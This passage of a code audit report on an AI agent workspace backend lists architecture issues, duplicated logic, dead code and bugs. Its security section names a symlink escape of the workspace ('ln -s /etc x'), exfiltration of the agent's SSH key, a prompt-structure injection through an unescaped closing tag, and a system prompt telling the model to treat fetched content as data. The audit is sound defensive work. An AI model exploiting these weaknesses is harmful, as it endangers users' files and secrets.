  participant API as API (features/conversations, runs)
  participant PG as Postgres
  participant R as Valkey
  participant W as Worker JobRunner
  participant RT as runtime (dispatch/agent/chat)
  participant P as Provider adapter
  participant T as Tools (+sandbox/browser/mcp-host)
  B->>API: POST /api/conversations/{id}/turns
  API->>PG: user msg + assistant placeholder + Run(kind) + Job(run.execute) + pg_notify
  B->>API: GET /api/runs/{id}/events (SSE, Last-Event-ID)
  API->>R: XREAD run:{id}
  PG-->>W: NOTIFY jobs_new; claim FOR UPDATE SKIP LOCKED
  W->>RT: dispatch.execute_run → execute_agent_run | execute_chat_run
  RT->>PG: snapshot policy/system/tools (agent) · load_history · resolve models
  RT->>P: stream_with_fallback → adapter.stream_chat
  P-->>RT: TextDelta/ReasoningDelta/ToolCall/Usage/Done
  RT->>R: XADD run:{id} message.delta (coalesced 64 chars / 50 ms)
  RT->>PG: checkpoint transcript, ToolCall rows
  RT->>RT: Tool.actions → policy.evaluate (allow/ask/deny)
  alt allow
    RT->>T: tool.run (wait_for timeout) → ToolResult (clip >16k to DATA_PATH/tool-outputs)
  else ask
    RT->>PG: Approval row; run → waiting_approval; job completes
    B->>API: POST /api/approvals/{id} → enqueue run.execute (resume from checkpoint)
  end
  B->>API: POST /runs/{id}/cancel → PUBLISH run:{id}:control + DB flag
  RT->>PG: _finalize → runs.set_status (commit) → XADD run.status + events:global
  RT->>PG: enqueue conversation.title, memory.extract
```

Main modules and import direction, checked with `cycles.py`:

- `core` (config, db, redis, logging, crypto, ids, errors) has no app dependencies. It is used everywhere.
- `db.base` is used by `features/*/models`, `jobs.models` and `knowledge.models`. `db.models` imports **all** feature models (for Alembic).
- `policy` (engine, models, presets, summary, shell_risk) is pure and imports only its own modules.
- `providers.base`, `catalog` and `claude_code_models` are pure. `providers.registry` imports `features.providers.models` and `features.secrets.service`. `providers.router` imports `features.settings.*`. So the provider layer depends on features.
- `web.safe_http/fetch/search/settings` are pure. `web/router.py` is an **API router inside a domain package** and imports `app.api.deps`.
- `workspace` (fs_guard, files, access) is pure. `workspace/revert.py` imports `features.runs.models`.
- `events` imports only `core.redis`. `jobs.queue` imports only `jobs.models`. `jobs.runner` and `jobs.scheduler` import runtime and features **lazily**.
- `tools.base` imports `features.attachments.images` (the core contract depends on a feature), `policy`, `providers.base`, `web.settings` and `workspace.access`. `tools.builtin.*` imports many feature services.
- `runtime.*` imports providers, tools, policy, events, jobs.queue and 19 feature modules (agent.py:37-56).
- `main_worker` imports `jobs.runner`, `jobs.scheduler`, `claude_runner_client` and `features.parts`.
- Back-edges from features into this scope: `features/permissions_router.py:15` (tools.registry), `features/conversations/service.py:36` and `features/runs/router.py:33` (runtime.outputs). They create no cycle.

---

## 6. Patterns and inconsistencies

**DB session usage, five styles:**
1. `async with get_sessionmaker()() as db:` with an explicit `commit` (61 occurrences in scope).
2. A local alias `sessionmaker = get_sessionmaker(); async with sessionmaker() as db` (chat.py:210, agent.py:1432).
3. `core.db.session_scope()` auto-commit. **Never used** (dead).
4. A function-local re-import alias `from app.core.db import get_sessionmaker as sessionmaker` at `jobs/runner.py:51`, although the module already imports it at the top (`:15`).
5. Services take a passed-in `db`, but commit semantics differ: `queue.claim/heartbeat/complete/fail/release`, `runs.set_status`, `notifications.create` and `subagents.wake_parent` commit internally; `queue.enqueue` and `subagents.spawn` do not. This is documented only in docstrings ("Commits.").

Tools open their own sessions inside `run()` (`ToolContext` has no `db`). The agent loop holds a session **across LLM calls**: `_maybe_compact` runs inside the session opened at `agent.py:424`, and `resolve_attachments`, which can call `references._summarize` (an LLM call), runs at `agent.py:446-448`. That keeps a pool connection and an open transaction busy during model calls (pool is 10 + 10).

**Error handling:**
- 28 `except Exception  # noqa: BLE001` in scope (36 in the whole app).
- There are about 15 domain exception classes and no common base: `ProviderError`, `NoModelAvailable` (an `AppError`, HTTP 409, also raised in the worker), `McpError`, `SandboxUnavailable`, `BrowserUnavailable`, `RunnerUnavailable`, `FetchError`, `SearchError`, `SpawnRefused`, `DecryptionError`, `OutsideWorkspace`, `_Retry`, `files.NotText` (an `AppError` with HTTP 415).
- The workspace and tool layer raises the HTTP-flavoured `AppError`, `NotFound` and `Conflict` (`workspace/files.py`, `workspace/revert.py`).
- `ProviderError` gets an extra attribute through `err.kind = kind  # type: ignore[attr-defined]` (`claude_code.py:430`).

**Logging:**
- The JSON formatter (`core/logging.py`) only serialises `extra={"ctx": {...}}` (19 uses). `bus.py:34` uses %-style args, and several messages carry no context (`chat.py:128,137`).
- Logger names are mixed: `__name__` (12) versus hardcoded `"worker"`, `"worker.jobs"`, `"worker.scheduler"` (`main_worker.py:22`, `runner.py:21`, `scheduler.py:10`).
- Counts: log.exception 4, warning 19, info 7, debug 4, error 1. `log.warning("provider error", ...)` logs `str(exc)` with each retry.

**Retries, about nine independent mechanisms:**
- Job backoff (`queue.py:112`).
- Per-model stream retries with linear sleep (`streaming.py:130-160`).
- SDK `max_retries=0` (both adapters).
- Redis client `Retry` (`core/redis.py:28-29`).
- Listener reconnect sleep 5 s (`runner.py:153`).
- The automation retry job.
- The claude_code `_Retry` (`claude_code.py:489-531`).
- OpenAI's one retry without `stream_options` (`openai_chat.py:164-171`).
- Chat and agent crash-resume counters (`chat.py:57` `MAX_ATTEMPTS=2`, `agent.py:107` `MAX_CRASH_RESUMES=2`; same idea, different names).

**Timeouts:** `asyncio.wait_for` (5), `asyncio.timeout` (2), and httpx timeouts set per call in 12 `httpx.AsyncClient(...)` constructions (each call creates a new client, with no connection reuse).

**Typing:**
- Counts in scope: 184 `Any`, 112 `dict[str, Any]`, 6 `# type: ignore` (33 in the whole app). Only 3 untyped defs: `shell_risk.py:488 _check_recursive_perm` and `:588 _moderate` (`noqa: ANN202`), and `docs.py:170 _record`.
- `focus.py:63` declares `db: object` and then needs two ignores (`:64`, `:72`). `mcp_tool.snapshot(db: Any)` and `for_run(db: Any)` (`mcp_tool.py:141,149`).
- The `Tool.actions` and `Tool.run` contract uses `args: Any`, and `AgentRun._validate` returns `Any` (`agent.py:877-879`).
- The run state is three untyped JSON bags:
  - `run.policy` has about 17 keys, written at agent.py:1320-1346 and read with `.get` at 1470-1529 and in `subagents.py:125-145`.
  - `run.totals` has about 18 keys (`active_s`, `tool_calls`, `child_steps`, `cost_usd`, `cost_unknown`, `consecutive_errors`, `texts`, `text`, `reasoning`, `model_label`, `questions`, `compactions`, token counts, `api_equivalent_cost_usd`).
  - `run.options` has `sources`, `notes`, `approved_plan`, `memory_context`, `turn_context`, `subagent`, `automation`, `no_retry`.
  - Typed pydantic models (RunSnapshot, RunTotals) would be the main typing win.
- mypy runs with `check_untyped_defs` only (no `disallow_untyped_defs` or `strict`).

**Sync IO in async code** (`syncio.py`):
- `files.sha256_file` runs on the event loop in `CreateZip.run` (file_exchange.py:384,387; the zip can be up to 1 GB) and in `DeletePath.run` (workspace.py:481; any file size).
- Many `Path.exists/is_dir/stat/resolve` calls in tool `run()`s (file_exchange.py:108-124, 191-202, 363-372, 493-521; workspace.py:304-311).
- Tool `actions()` is sync and does filesystem resolution on the loop.
- Token files are read synchronously on every call (`sandbox_client.py:42-55`, `browser_client.py:38-48`, `mcp/client.py:160-171`, `claude_runner_client.py:41-52`).
- `claude_code_check.py:112-158` (CLI, harmless).

**Other inconsistencies:**
- Path guards are used in two ways: `fs_guard.resolve` (workspace.py tools) and `files.resolve` (file_exchange.py; it adds the `.trash` hidden check and the `AppError` mapping).
- There are two event-emitting paths. `AgentRun._emit` publishes to Redis only (`agent.py:325`). `runs.emit` also persists `DURABLE_EVENTS` (`features/runs/service.py:23-29,47-67`). `"run.fallback"` is listed as durable but is only published live (`streaming.py:162-170`), so it is never persisted. `"run.error"` is listed but never emitted.
- `agent.py` imports private names from `chat.py` (`_maybe_enqueue_title`, `_watch_for_cancel`; `agent.py:79-84`).
- Stale docstrings: `ask.py:37` references `AgentRun._step` (it does not exist); `streaming.py:3` says "the agent runtime later" (it already uses it); `config.py:67` says browser is "worker only" (the API uses it too).

---

## 7. Duplicated logic

1. **Service client boilerplate, four copies.** Each has a module-global `override` test hook, a `_connection()` that reads a token file and maps `OSError` to an "X unavailable" error, `Authorization: Bearer`, special handling of 401, and `detail` extraction. See `sandbox_client.py:37-55,79-108`, `browser_client.py:28-107` (and `act()` at `:51-82` duplicates its own `_request`/`_detail` at `:85-107`), `mcp/client.py:153-197`, `claude_runner_client.py:31-88`. `available()` is duplicated (`browser_client.py:33`, `claude_runner_client.py:36`) and again in `features/parts.local_parts`.
2. **One-shot "collect the text and usage of a model call", four copies**: `chat.py:394-398`, `compaction.py:159-163`, `references.py:73-77`, `features/memory/extraction.py:162`.
3. **Context budget**: `chat.build_request` (chat.py:93-94) and `agent._budget` (agent.py:1141-1145) are the same formula. The `32_000` default appears in four places (chat.py:58, agent.py:1143, compaction.py:148, references.py:63).
4. **Finalising the assistant message** (reasoning and text blocks, status mapping, `last_message_at`, `message.completed`, set_status): `chat._finish` (chat.py:162-206) and `agent._finalize` (agent.py:1178-1224).
5. **Turn-context rendering**: inline in chat.py:257-286 and in `agent._add_turn_context` (agent.py:1358-1386). Last-user-text extraction: chat.py:265-275, `agent._last_user_text` (agent.py:1254-1262), `fake._last_user_text`.
6. **Head/tail clipping**: `compaction.clip` (compaction.py:75), `shell._head_tail` (shell.py:47), `outputs.clip` (outputs.py:30), `mcp_tool._brief` (:53), `shell._short`, `openai_chat._short`, ad-hoc slicing in browser.py, subagent.py and the MCP client.
7. **Stop-reason maps**: `_STOP` is identical in `anthropic.py:55` and `claude_code.py:62`. Each adapter also has its own `_map_error`.
8. **Message-to-text renderers**: `compaction.render` (:82), `claude_code._render_message`/`render_catchup` (:108-139), `references` (uses compaction.render).
9. **Dedupe pre-check before `queue.enqueue`**, which already does the check: `features/documents/service.py:291`, `features/memory/extraction.py:75` (both reach the model through `queue.Job`).
10. **Rank and order tables**: `agent._RISK_ORDER` (agent.py:110), `shell_risk._ORDER` (:22), plus the unused `shell_risk.max_risk` (:678), `engine._RANK` (decisions) and `summary._RANK` (levels).
11. **The `NoInput` model is defined four times**: automation.py:19, browser.py:232, docs.py:35, workspace.py:506.
12. **Model label** `f"{display_name} · {provider_name}"`: `streaming._label` (:210), chat.py:187, agent.py:561.
13. **The `while not stop: try...; wait_for(stop.wait(), timeout)` loop**: main_worker.py:33-46 and 49-64, scheduler.py:33-44.
14. **Backup folder path** `DATA_PATH/run-backups` is built in `workspace.py:63` and `revert.py:23`.
15. **Model resolution for chat**: `dispatch._chat_uses_tools` (dispatch.py:20-31) and `agent._resolve_models` (agent.py:1391-1404).

---

## 8. God files and functions

Files over 400 lines in scope (7): `runtime/agent.py` 1623, `providers/adapters/claude_code.py` 715, `policy/shell_risk.py` 679, `tools/builtin/file_exchange.py` 532, `tools/builtin/workspace.py` 518, `tools/builtin/tasks.py` 506, `runtime/chat.py` 413.

Functions over 80 lines (6): `AgentRun._process_tools` agent.py:679 (**197** lines), `execute_agent_run` agent.py:1431 (**178**), `claude_code.plan` claude_code.py:233 (134), `execute_chat_run` chat.py:209 (132), `AttachFile.run` file_exchange.py:180 (83), `_snapshot` agent.py:1265 (82).

**Outline of `runtime/agent.py` and natural seams:**

| Lines | Responsibility | Suggested module |
|---|---|---|
| 107-243 | Constants and prompt sections (AGENT_SYSTEM_PROMPT, PROFILE/SKILLS/PLAN_REVIEW/AUTOMATION/BROWSER sections, LIMIT_NOTICE), `build_system_prompt`, `limit_message`, `_plan_listing` | `runtime/agent/prompts.py` |
| 246-345 | `AgentRun.__init__`, ToolContext wiring, the `_emit`, `_record_change` and `_add_image` callbacks | `runtime/agent/context.py` |
| 347-408 | Accounting and limits (`_checkpoint_time`, `_limit_reached`, `_add_usage`, `_pause_requested`) | `runtime/agent/accounting.py` (also used by `subagents.remaining_budget/charge_parent`) |
| 410-671 | Model step loop (`drive`, `run`, `_tools_rejected`, `_builder`, `_save_model_output`, `_append_text`, `_inject_notes`, `_maybe_compact`, `_wrap_up`) | `runtime/agent/loop.py` |
| 673-1071 | Tool-call state machine: `_process_tools` (approval resume, crash resume, validate, ask_user, plan gate, policy, ask/deny/execute), `_validate`, `_ask`, `_ask_plan_review`, `_run_approved_plan`, `_execute`, sub-agent glue, `_finish_row` | `runtime/agent/tool_step.py`. Split `_process_tools` into `resume_waiting(row)`, `resume_running(row)` and `decide(row)`, with a small decision pipeline |
| 1074-1138 | Approval and question result text (`_answer`, `_note_question`, `_denial`, `_notify_question`) | `runtime/agent/approvals.py` |
| 1141-1247 | `_budget`, `_answer_message`, `_get_run`, `_save_progress`, `_finalize`, `_stop_subagents` | `runtime/finalize.py`, shared with chat `_finish` |
| 1250-1386 | Snapshot: `CHAT_LIMITS`, `_last_user_text`, `_snapshot`, `session_key_for`, `_add_turn_context` | `runtime/agent/snapshot.py`, with a typed `RunSnapshot` model |
| 1389-1428 | `_resolve_models` | `runtime/models.py`, shared with `dispatch` |
| 1431-1623 | Entry point `execute_agent_run` (load and validate the run, crash resume, snapshot, toolset build including MCP, cancel watcher, outcome to status mapping) and `_after_answer` | `runtime/agent/entry.py`; outcome handling becomes a dict of outcome to handler |

Code shared with `chat.py` should move out of `chat.py`: `CancelFlag` and `_watch_for_cancel` into `runtime/cancel.py`; `VISUALS_HINT` and `SYSTEM_PROMPT` into prompts; `_maybe_enqueue_title` into `runtime/followups.py`.

---

## 9. Circular imports (`cycles.py`, Tarjan SCC over `backend/app`)

- **Top-level imports only: no cycles.** (Module names are resolved to the longest existing submodule, so `from app.features.memory import service` counts as a dependency on `app.features.memory.service`.)
- **Including function-level imports: one SCC.** `app.runtime.history -> app.runtime.references -> app.runtime.history`, and `compaction -> history -> references -> compaction`. It is broken by the lazy import at `runtime/history.py:72` (`resolve_attachments`), with the comment "references needs load_history".

Function-level imports in scope, and why:

| Location | Imports | Reason |
|---|---|---|
| `runtime/history.py:72` | `runtime.references` | **Real cycle dodge** |
| `web/settings.py:32` | `web.safe_http` | Comment says "avoid an import cycle", but `safe_http` imports nothing from `web`, so it is **not a cycle**. Can be moved to the top |
| `jobs/runner.py:31-68` (8 lazy imports) | runtime.chat, runtime.dispatch, features.{memory, documents, notifications, automations, mcp} | No cycle. Deferred loading only (and `:51` re-imports `get_sessionmaker` under an alias) |
| `jobs/scheduler.py:16-21` | features.{automations, calendar, conversations, notifications, runs, updates} | No cycle. Deferred loading only |
| `providers/adapters/claude_code.py:376-377,386-390` | `core.db`, `features.providers.models`, sqlalchemy | No cycle (`registry` already imports `features.providers.models` at top level). Deferred loading or a test seam |
| `claude_runner_client.py:108,123` | `core.redis` | No cycle |
| `cli.py:30,50,56` | redis, claude_code_check, main_api | Intended (CLI startup cost) |
| `web/fetch.py:35,55` | trafilatura, pypdf | Heavy third-party imports, intended |
| features/api | 4 function-level imports (out of scope) | – |

---

## 10. Dead-code candidates

Method: an AST list of every top-level definition and method in scope, then a word-boundary search across `backend/app`, `backend/tests`, `backend/migrations`, `frontend/src` and `e2e` (`dead.py`), followed by manual checks for dynamic or string use.

| Candidate | Evidence | Confidence |
|---|---|---|
| `core/db.py:36 session_scope` | 0 references outside its definition, in app, tests, frontend and e2e | **High** |
| `policy/shell_risk.py:678 max_risk` | 0 references | **High** (or use it in place of agent.py:806) |
| `policy/engine.py:83` `evaluate(..., parent=...)` parameter | Production code never passes `parent=`; only `tests/unit/test_policy_engine.py` does. `ancestors` superseded it | High (test-only API) |
| `tools/registry.py get()` (`:74`) | Only `tests/api/test_failures.py` and `test_agent_runtime.py` use it | Medium (test-only helper; keep or move to tests) |
| `providers/base.py Message.assistant()` | Only tests (`test_claude_code_adapter.py`) use it | Medium (test-only) |
| `features/runs/service.py DURABLE_EVENTS "run.error"` | Never emitted anywhere | High (dead entry) |
| `core/config.py trusted_proxies`, `tz` | Never read in Python (see §4.1) | High (keep only if documented as compose passthrough) |
| `jobs.models Job.priority` / `enqueue(priority=)` | No caller passes a priority | Medium (unused feature) |
| `migrations/0001` `CREATE EXTENSION pg_trgm` | No `trgm` or `similarity(` use in app or migrations | Medium (unused extension) |
| `core/crypto.py DecryptionError` | Raised, but no app code catches it (only `tests/unit/test_crypto.py`) | Not dead; it is an **unhandled error type** (see B1) |
| `web/settings.py` lazy-import comment ("avoid an import cycle") | No cycle exists (§9) | High (stale comment) |
| `tools/builtin/ask.py AskUser.run`, `subagent.py RunSubagent.run` | Never executed (the runtime intercepts them) | Intentional: they satisfy the abstract method. Not dead |
| Every `Tool` subclass flagged "used once" | Referenced only through the registry lists; called by the model via its name string | False positives |

---

## 11. Bugs (not fixed)

| # | Severity | Location | Problem | Suggested fix |
|---|---|---|---|---|
| B1 | High | agent.py:1548-1557, :1486-1490; chat.py:317-327; jobs/runner.py:176-202 | Any non-`ProviderError` exception leaves the Run `queued` or `running` forever (see §0). Concrete triggers: `DecryptionError` from `registry.build_config` inside `resolve` (only `NoModelAvailable` is caught); `ValueError` from `make_adapter` when the fake provider is disabled; `KeyError` for an unknown provider type; asserts at agent.py:1460-1462; exceptions in `tool.actions()` (agent.py:791); `OSError` from `outputs.clip` | Wrap the handler: on the final job failure, or on any unexpected exception, `_finalize(run, "failed", error=...)`. Add a periodic sweep for runs that are `running` without a live job lease |
| B2 | Medium | workspace/files.py:96-102 (`list_dir`), :312-325 (`search`); fs_guard.py:38-41 | `entry()` calls `rel(path)`, which calls `fs_guard.relative`. That calls `path.resolve().relative_to(root)` and raises **ValueError** for a symlink that points outside the workspace (easy to create with `run_shell`: `ln -s /etc x`). Only `OSError` is caught, so listing the folder and file search fail (the API returns 500; the tool errors). Symlinks inside the workspace show the *target's* path instead of the link's | Do not resolve for display (`path.relative_to(root)` on the unresolved path), and catch `ValueError` or skip out-of-tree links |
| B3 | Medium | workspace.py:478-489 (`DeletePath`), files.py:234-253 (`trash`), :187-191 (`move`) | `fs_guard.resolve` follows symlinks, so `delete_path link` moves the link's **target** into the trash (and `move_path link` moves the target). The FileChange records the target's path | Resolve the parent and keep the final component unresolved for delete and move (lstat semantics) |
| B4 | Medium | providers/adapters/anthropic.py:52, :137 | `max_tokens` defaults to 64 000 for every request. The runtime never sets `max_tokens` for chat or agent turns (chat.py:85-106, agent.py:523-538). Models with a lower output cap (for example Claude 3.x Haiku at 4k/8k) get a 400 | Clamp to `ResolvedModel.max_output`, or pass `max_tokens` from the builder |
| B5 | Medium-Low | agent.py:1437-1458; jobs/queue.py:149-162 | Two `run.execute` jobs for the same *queued* run (approve plus resume, expiry plus approve) can both be claimed before either commits `running`. `other_worker_has_run` is only checked on the `running` branch, so both drive the loop and tools may run twice | Claim the run atomically (`UPDATE runs SET status='running' WHERE id=? AND status IN ('queued',...) RETURNING`) or `SELECT ... FOR UPDATE` |
| B6 | Low-Med | jobs/runner.py:204-211 | The `heartbeat()` return value (lease lost) is ignored. After a long DB hiccup the reaper requeues the job while the first worker keeps running, so it executes twice | Cancel the job task when the heartbeat returns False |
| B7 | Low-Med | agent.py:1225-1233 | When `automations.on_run_finished` fails, the code calls `db.rollback()` and then uses `run.id` / `run.parent_run_id`. The rollback expires every instance, so the lazy refresh on an AsyncSession is likely to raise `MissingGreenlet`. Sub-agents are then not stopped and the parent is not woken. Verify with a test | Capture the ids before the try, or `await db.refresh(run)` |
| B8 | Low | jobs/queue.py:43-56; features/documents/service.py:291; features/memory/extraction.py:75 | The dedupe check-then-insert has no ON CONFLICT handling, so concurrent enqueues with the same key raise `IntegrityError` (unique `dedupe_key`) | `INSERT ... ON CONFLICT (dedupe_key) DO NOTHING RETURNING` |
| B9 | Low | (no code) | The `jobs` table is never pruned, and neither are `DATA_PATH/run-backups` (every write and edit copies the whole file; `workspace.py:61-67`) or the `events:global` stream (no TTL) | Add retention tasks to the scheduler |
| B10 | Low | chat.py:366-413 (`generate_title`) | No handling for `NoModelAvailable` or `ProviderError`, so the job is retried 3 times with `log.exception` each time. The `title:{conv}` dedupe key also means a title is never generated again for that conversation | Catch and return |
| B11 | Low | streaming.py:162-170 vs features/runs/service.py:23-29 | `run.fallback` is declared durable but only published live, so it is missing from the persisted timeline after the Redis TTL | Use `runs.emit(db, ...)`, or remove it from DURABLE_EVENTS |
| B12 | Low | tools/builtin/browser.py:86-96 | `browser_elements` lives in the in-memory `ctx.state`. After any suspension or resume (approval, crash), approval summaries degrade to "Click element [n]", so the user approves blind | Persist the element names in `run.options`, or fetch them from browserd |
| B13 | Low | file_exchange.py:233-235 | `AttachFile` unlinks the older attachment files before the new rows are committed. A failure in `store_output` or the commit loses the file while the DB row survives the rollback | Delete files after commit |
| B14 | Low | jobs/scheduler.py:33-44 | Periodic tasks run sequentially. A slow GitHub check (`updates.check_if_due`) delays reminders and approval expiry | Run each task on its own timer, or with `asyncio.gather` |
| B15 | Low | chat.py:343-356 | A title is only scheduled when `assistant_seq == 2`. With message versions or edits the first answer can have a different seq, so the title is skipped | Count assistant messages instead |
| B16 | Low | runtime/references.py:52-53 | `_wrap` only escapes `"` in the title. Body text containing `</referenced_chat>` ends the wrapper early (prompt-structure injection from an old chat with web content) | Neutralise closing tags in the body |
| B17 | Info | tasks.py:477 | `attach_file_to_task` is marked `idempotent = True` but writes. It is safe only if `links.attach` dedupes | Verify, or set False |

---

## 12. Security smells (details beyond §0)

- **Workspace folder access is not a boundary when shell is allowed.** `run_shell` only checks `cwd` (`shell.py:78-107`). The command can read and write hidden or read-only folders and `.trash`, and can plant symlinks. This is documented in the shell.py docstring, but it is also the source of S5, S6, B2 and B3.
- **fs_guard** itself is sound for traversal: it rejects NUL, strips a leading `/` and `/workspace`, rejects drive letters, resolves symlinks and checks `is_relative_to`. Its weak points are TOCTOU (S6) and symlink semantics (B2/B3). `outputs.output_path`, `revert._backup_path` and `files._trash_slot` validate their inputs (UUIDs, isalnum). `files.restore` does not validate `meta["name"]` (S5).
- **Zip handling** is good: it checks traversal, absolute paths and drive letters (`file_exchange.py:415-426`), skips symlinks, rejects encrypted zips, caps the ratio and size, and verifies declared sizes while streaming.
- **SSRF:** `web/safe_http.py` is good apart from S11. `url_action`'s cheap pre-check (`web.py:39-53`) does not flag single-label Docker names such as `postgres` or `valkey`, but the connect-time check blocks them. SearXNG and remote MCP URLs use unguarded clients (they are user-configured; acceptable). The browser relies on its own guard in browserd (out of scope).
- **Policy engine:**
  - It fails open on empty actions (S4).
  - Run grants lift `ask` decisions coming from **ancestor** layers: only the ceiling is checked in step 4 (`engine.py:115-120`), so a sub-agent's own grant overrides an ancestor's `ask`.
  - An approved call is executed later without re-evaluation (by design: the policy is a snapshot).
  - `browser_open` drops its resource (`browser.py:143-145`), so one "allow for this run" covers every URL.
  - MCP capability strings embed raw server tool names, which may contain `.` (`features/mcp/service.py:65-66`), so a user's wildcard rules can match more than intended.
  - Tool-name collisions inside one run silently overwrite each other (`self.tools = {t.name: t ...}`, agent.py:290).
- **Secrets:**
  - Provider keys and headers are decrypted per resolve and kept in `ResolvedModel.config` (`repr=False`), but `ProviderConfig` repr leaks (S9).
  - MCP target headers and env come from `service.target_for` and are passed only to the client or hostd.
  - Shell output, including anything secret a command prints, is streamed to Redis (`tool.progress`, 24 h TTL) and stored in `ToolCall.result_data` (64 KB tail) and `DATA_PATH/tool-outputs`.
  - `jobs.last_error` stores `str(exc)`.
  - `printenv` and `env` are rated "safe" (fine only if sandbox env stays clean).
  - The agent SSH key can be exfiltrated (S8).
- **Tokens for sandbox, browser, mcp-host and claude-runner:** random per start and re-read per call, which is good. But they are reachable over the shared `egress` network (S3); runner `/health` is unauthenticated; the API container also holds the browser token (compose `app` mounts `browser-token`); and production modules have module-global `override` hooks (test seams that monkeypatch globals).
- **Prompt-injection posture:** untrusted-content labels are added for web, browser and MCP results and referenced chats, and the system prompt says "data, not instructions". But the defaults combine autonomous reads, autonomous network egress (fetch and search) and autonomous memory writes (S1).

---

## 13. Migrations and pyproject

**Migrations** (`migrations/versions/0001`…`0029`): a linear chain with string revisions "0001"→"0029" and no branches. Oddities:
- The filename `0017_projects_as_workspaces_and_chat_.py` is truncated (trailing underscore).
- `0001` creates `vector` and **`pg_trgm` (unused)**.
- Data migrations: `0016` (sets `tools=true` for every model; its downgrade is a no-op); `0017` (CTE rename and backfill); `0024` downgrade (`UPDATE tasks SET status='blocked' WHERE status='waiting'`, a lossy downgrade); `0026` downgrade deletes built-in skills.
- `migrations/env.py` has `# type: ignore[no-untyped-def]` on `_do_run`, and reads `get_settings()` (so migrations need APP_SECRET_KEY set).
- There is no vector index on `knowledge_chunks.embedding` (only a GIN index on tsv), so vector search is a sequential scan. Fine for a single user.

**pyproject.toml:**
- The package name `ai-workspace` differs from the product name Anemo.
- The version `1.0.0` is kept by hand in three places (`pyproject.toml`, `app/__init__.py:5`, `frontend/package.json`).
- Dependencies have lower bounds only (uv.lock pins them).
- Ruff selects `S` and `ASYNC`, but the ASYNC rules do not catch `pathlib` sync IO.
- mypy is not strict (`check_untyped_defs` only); there is no coverage config.
- pytest uses a session-scoped event loop, and integration tests need real Postgres and Valkey.
- There is no `[project.scripts]`; entry points are `python -m app.main_worker` and `python -m app.cli`.
